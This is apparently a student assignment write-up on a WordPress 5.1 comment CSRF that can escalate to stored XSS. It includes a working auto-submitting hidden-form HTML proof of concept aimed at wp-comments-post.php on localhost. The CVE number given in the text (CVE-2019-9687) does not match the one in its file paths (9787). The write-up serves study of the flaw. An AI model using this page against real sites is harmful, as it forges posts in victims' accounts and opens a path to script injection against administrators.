# Cross-site request forgery (CSRF) that can extend to Cross-site scripting (XSS)
## Description:
The vulnerability (CVE-2019-9687) exists in Wordpress version 5.1 and prior releases, this vulnerability allows remote users to forge requests and post comments on the accounts of other users. This vulnerability can cause more than just posting a comment and can extend to remote code execution via XSS. Since wordpress doesn't sanitize the admin's input, admins are able to write and execute code in comments, bios... Therefore, by forging a request to post a comment on the admins account, we can achieve remote code execution. For the sake of the assignment, I will be only focusing on conducting the CSRF attack.

### Vulnerability origin:
In order not to break features such as trackbacks and pingbacks, Wordpress didn't perform CSRF validation when a user posts a new comment. As a result, wordpress had a CSRF vulnerability in posting comments. 
### Significance:
This vunerability is considered to be of high significance/severity, this is because it can escalate from a CSRF attack to an XSS attack if the victim was an administrator.

## Designed Attack:
### Steps to conduct the attack:  
 1. Conduct an investigation to forge the request:  
 Post a comment and use the creater tool to get the Information needed:   
 **Request URL:**   
    As shown on in the screenshot below, we can get the Request URL from the request header.

    ![RequestURL](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2019-9787/screenshots/RequestURL.png) 

    **Request Type**
    As showns below, the request type is `POST`.

    ![RequestType](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2019-9787/screenshots/RequestType.png) 

    **Parameters:**
    As we can see from the screenshot below, the request takes four parameters. We only need to pass the two parameters (`comment` and `comment_post_ID`) to successfuly forge the request:   
    `comment`: contains the value or the comment we want to post.   
    `comment_post_ID`: represents the ID of the comment.   

    ![Params](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2019-9787/screenshots/Params.png) 
    




2. Create the malicious webpage that forges the request:  
We construct the webpage that forges the request as following:   
We write code that dynamically creates a `JavaScript` form with entries spesified by `fields`, with type `POST`. We set the type of the form entries to hiden in order to not be visible to users, and finally, the form is auto submitted.   
    ```HTML
    <!DOCTYPE html>
    <html>
        <body>
            <h1>This page forges an HTTP POST request.</h1>
            <script type="text/javascript">
                function forge_post()
                {
                    var fields;
                    fields += "<input type='hidden' name='comment' value='GOTCHA :P'>";
                    fields += "<input type='hidden' name='comment_post_ID' value='1'>";

                    var p = document.createElement("form");

                    p.action = "http://localhost/wordpress/wp-comments-post.php";
                    p.innerHTML = fields;
                    p.method = "post";

                    document.body.appendChild(p);

                    p.submit();
                }

                window.onload = function() {forge_post();}
            </script>
        </body>
    </html>
    ```

## Sample Attack Demonstration:
### _Attacker:_
 As the attacker, I Upload my webpage to the web (I called it proj3.html):   

![PageUpload](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2019-9787/screenshots/PageUpload.png) 


As a regular user, I then post a comment with the link to the webpage, now if anyone clicks on the link, a comment I wrote will be posted from their account.

![Comment](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2019-9787/screenshots/Comment.png) 

### _Victim:_
As the admin, I will click on the link, and then get redirected to where the comment was just posted:

![ForgedComment](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2019-9787/screenshots/ForgedComment.png)      

Again, this comment can include code that would get executed an that would escalate the attack to a XSS attack.

## Video Demonstration:
[Click here](https://www.screencast.com/users/moemen.el/folders/Capture/media/19c01aaf-0675-4413-a22a-aed9fd24597a) for a video demonstration of the attack.
